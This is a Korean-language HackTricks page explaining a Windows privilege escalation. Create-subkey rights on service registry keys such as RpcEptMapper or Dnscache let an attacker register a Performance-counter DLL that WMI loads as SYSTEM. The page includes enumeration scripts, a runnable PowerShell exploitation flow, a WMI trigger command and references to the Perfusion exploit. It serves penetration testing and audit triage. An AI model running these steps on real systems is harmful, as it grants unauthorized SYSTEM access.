# Service Registry에 대한 AppendData/AddSubdirectory Permission

{{#include ../../banners/hacktricks-training.md}}

**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Summary

서비스 registry key에 **`Create Subkey`** / **`AppendData/AddSubdirectory`** 권한만 있어도 이는 여전히 유용한 privesc 단서입니다. 일반적으로 **`ImagePath`**, **`ServiceDll`** 또는 기타 기존 값을 직접 덮어쓸 **수는 없지만**, 다음 위치에 **`Performance`** 하위 key를 생성할 수는 있습니다.

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- token에 **`KEY_CREATE_SUB_KEY`** 권한이 있는 기타 **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key

핵심은 Windows가 이전 버전의 **PerfLib V1** registration model을 여전히 지원한다는 점입니다. 서비스에 **`Performance`** subkey가 있으면, performance counter consumer가 데이터를 요청할 때 Windows가 해당 위치의 DLL을 로드할 수 있습니다.

Microsoft documentation에 따르면, 최소 registration은 다음과 같습니다.<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
따라서 offensive takeaway은 다음과 같습니다. **`SetValue`가 아닌 `CreateSubKey`만 얻었다는 이유로 service registry finding을 무시하지 마세요**.<sup>[[3]](#references)</sup>

## 이것만으로 code execution이 가능한 이유

이러한 service에는 일반적으로 `Performance` subkey가 기본으로 존재하지 않으므로 **`KEY_CREATE_SUB_KEY`**가 필요한 primitive입니다. Key가 존재하고 `Library`/`Open`/`Collect`/`Close`를 포함하면, 모든 **performance counter consumer**가 DLL load를 trigger할 수 있습니다.<sup>[[3]](#references)</sup>

몇 가지 중요한 세부 사항:

- **`Library`** value는 **full DLL path**를 지정할 수 있습니다.
- DLL은 **`OpenPerfData`**, **`CollectPerfData`**, **`ClosePerfData`**를 export하고 `ERROR_SUCCESS`를 return해야 합니다.
- Code는 **vulnerable service process 자체가 아니라**, **consumer의 context**에서 실행됩니다.
- 일반적인 `RpcEptMapper` / `Dnscache` case에서는 **WMI performance query**가 **`wmiprvse.exe`**로 하여금 DLL을 **`NT AUTHORITY\SYSTEM`**으로 load하게 만들 수 있습니다.

이 때문에 triage 중에는 이 primitive를 쉽게 놓칠 수 있습니다. Parent service key가 "fully writable"하지 않더라도 여전히 weaponizable하기 때문입니다.

## Quick enumeration

**AccessChk**를 사용한 manual spot-check:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
서비스 키에 **`CreateSubKey`** 권한이 있는 낮은 권한 주체를 찾는 PowerShell 예시:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
유용한 tooling:

- **PrivescCheck**: `Get-ModifiableRegistryPath`는 이 유형의 문제를 탐지하기 위해 특별히 제작되었습니다.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: 레거시 취약 대상에서 DLL drop, `Performance` registration, WMI trigger, token duplication 및 cleanup을 자동화합니다(예: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## 악용 흐름

`Performance` subkey를 생성하고 필요한 값을 설정합니다:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
그런 다음 **권한 있는** performance consumer를 trigger합니다. 전형적인 예는 `Win32_Perf*` 클래스를 대상으로 하는 WMI query입니다:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
운영 참고 사항:

- **`perfmon.exe`**를 실행하면 counter registration이 올바른지 확인하는 데 유용하지만, 일반적으로 **자신의 사용자 context**에서만 DLL을 load합니다.
- 실제 LPE를 수행하려면 **WMI**와 같은 **privileged** consumer를 trigger해야 합니다.
- 자체 exploit을 작성하는 경우, DLL 내부에서 직접 `cmd.exe`를 spawn하면 일반적으로 **session 0**의 shell을 얻게 됩니다. `Perfusion`은 privileged token을 공격자의 session에서 suspended 상태로 생성된 process에 duplicate하여 이 문제를 해결합니다.<sup>[[4]](#references)</sup>
- DLL architecture를 target consumer에 맞춰야 합니다(**x64 systems에서는 x64**).

## Version notes / recent developments

Historically, 내장된 weak key는 다음과 같습니다:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` 및 `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion`에 따르면 **April 2021** updates는 updated **Windows 8 / Windows Server 2012**에서 손쉬운 exploitation 경로를 제거했지만, **Windows 7 / Windows Server 2008 R2**는 **`Dnscache`**를 통해 계속 exploit할 수 있었습니다.<sup>[[4]](#references)</sup>

이 primitive는 **historical한 것만은 아닙니다**. **January 2025**, Microsoft는 **`Network Configuration Operators`**의 members가 **`Dnscache`** 및 **`NetBT`** 아래에 subkey를 생성할 수 있었던 관련 AD DS issue를 patch했으며, 동일한 **Performance-counter DLL registration** 아이디어를 재사용하여 supported systems에서 **SYSTEM**에 도달할 수 있었습니다.<sup>[[2]](#references)</sup>

따라서 modern lesson은 generic합니다. low-privileged principal이 **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**에 **`CreateSubKey`** 권한을 가지고 있다면, 해당 finding을 무시하기 전에 **`Performance`** child key만으로 충분한지 확인해야 합니다.

## References

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
